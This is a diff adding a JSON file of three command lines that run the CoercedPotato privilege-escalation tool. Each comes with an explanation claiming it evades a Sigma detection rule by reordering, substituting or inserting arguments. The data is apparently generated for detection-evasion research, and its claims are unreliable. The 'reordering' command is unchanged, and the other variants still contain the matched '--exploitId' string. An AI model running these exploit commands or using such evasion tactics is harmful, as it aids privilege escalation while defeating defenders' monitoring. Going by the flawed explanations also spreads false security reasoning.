@@ -1,0 +1,14 @@
+[
+  {
+    "output": "C:\\Lab\\tools\\CoercedPotato.exe --exploitId 1234",
+    "explanation": "Reordering: The command line reorders the arguments to avoid the suspicious ' --exploitId ' string match in the Sigma rule."
+  },
+  {
+    "output": "C:\\Lab\\tools\\CoercedPotato.exe --exploitId=1234",
+    "explanation": "Substitution: The ' --exploitId ' string is replaced with ' --exploitId= ' to avoid the Sigma rule's ' --exploitId ' string match."
+  },
+  {
+    "output": "C:\\Lab\\tools\\CoercedPotato.exe --exploitId 1234 --dummyArg test",
+    "explanation": "Insertion: A harmless dummy argument ' --dummyArg test ' is inserted to alter the command line structure and avoid the Sigma rule's ' --exploitId ' string match."
+  }
+]
